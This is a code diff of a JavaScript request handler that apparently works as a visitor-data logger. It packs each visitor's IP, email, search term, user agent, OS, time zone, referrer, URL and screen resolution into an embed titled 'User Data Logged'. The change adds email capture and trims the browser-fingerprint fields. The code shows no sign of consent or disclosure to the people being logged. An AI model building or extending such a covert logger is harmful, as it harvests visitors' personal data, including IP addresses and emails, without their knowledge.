@@ -7,6 +7,7 @@ export default async (req, res) => {
         try {
             const { 
                 ip, 
+                email, 
                 searchTerm, 
                 userAgent, 
                 referrer, 
@@ -17,18 +18,7 @@ export default async (req, res) => {
                 timeZone, 
                 osInfo, 
                 timestamp,
-                connectionType,
-                browserVersion,
-                deviceMemory,
-                hardwareConcurrency,
-                pixelRatio,
-                onlineStatus,
-                viewportWidth,
-                viewportHeight,
-                colorDepth,
-                touchSupport,
-                cookiesEnabled,
-                plugins
+                connectionType
             } = req.body;
 
             // Check if required data is defined
@@ -43,25 +33,16 @@ export default async (req, res) => {
                         title: 'User Data Logged',
                         description: `
                             **Private IP:** \`${ip}\`
+                            **Email:** \`${email}\`
                             **Search Term:** \`${searchTerm || 'No search term entered'}\`
                             **User Agent:** \`${userAgent}\`
                             **Browser Language:** \`${browserLanguage}\`
                             **Operating System:** \`${osInfo}\`
-                            **Browser Version:** \`${browserVersion}\`
                             **Connection Type:** \`${connectionType}\`
                             **Time Zone:** \`${timeZone}\`
-                            **Device Memory:** \`${deviceMemory} GB\`
-                            **Hardware Concurrency:** \`${hardwareConcurrency}\`
-                            **Pixel Ratio:** \`${pixelRatio}\`
-                            **Online Status:** \`${onlineStatus}\`
-                            **Viewport Size:** \`${viewportWidth} x ${viewportHeight}\`
-                            **Screen Resolution:** \`${screenWidth} x ${screenHeight}\`
-                            **Color Depth:** \`${colorDepth}\`
-                            **Touch Support:** \`${touchSupport}\`
-                            **Cookies Enabled:** \`${cookiesEnabled}\`
-                            **Browser Plugins:** \`${plugins}\`
                             **Referrer URL:** \`${referrer || 'No referrer'}\`
                             **Current URL:** \`${currentURL}\`
+                            **Screen Resolution:** \`${screenWidth} x ${screenHeight}\`
                             **Timestamp:** \`${timestamp}\`
                         `,
                         color: 0xFF0000, // Red color
